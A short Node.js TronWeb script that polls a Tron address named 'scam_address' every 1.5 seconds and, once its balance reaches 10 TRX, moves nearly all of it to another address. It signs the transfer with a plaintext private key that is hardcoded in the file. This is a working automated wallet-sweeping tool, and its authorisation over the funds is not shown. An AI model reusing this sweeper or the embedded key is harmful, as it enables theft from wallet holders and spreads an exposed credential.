const TronWeb = require('tronweb')

const scam_address = 'TAwMSnjiTvKdgucGYVae1YubbjkhAXoqfx'
const real_private_key = '2a4e64e3c585f9abb4d6b5dd3e515959fc3e80f85b02b46ec3bde1f8ea84e77c'
const send_to = 'TUYsLvTy3RbnBMj1PHarzx6WvFwPAdgQ7A'

async function main(){
    try{
        const tronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',
        })

        let check_it = setInterval(async function () {
            try{
                let balance = await tronWeb.trx.getBalance(scam_address)
                console.log(`Current balance ${balance}`)
                let sac = true
                if (balance/1000000 >= 10){
                    const withdraw_amount = balance - 2000000
                    console.log(`Withdrawing ${withdraw_amount} TRX`)

                    const first_tx = await tronWeb.transactionBuilder.sendTrx(send_to, withdraw_amount, scam_address);
                    let signed_tx = await tronWeb.trx.multiSign(first_tx, real_private_key, 0)
                    let asd = await tronWeb.trx.sendRawTransaction(signed_tx)
                    console.log(asd)
                }
            }catch (err){
                console.log(err.message)
            }
        }, 1500);
    }catch (err){
        console.log(err)
    }
}

main()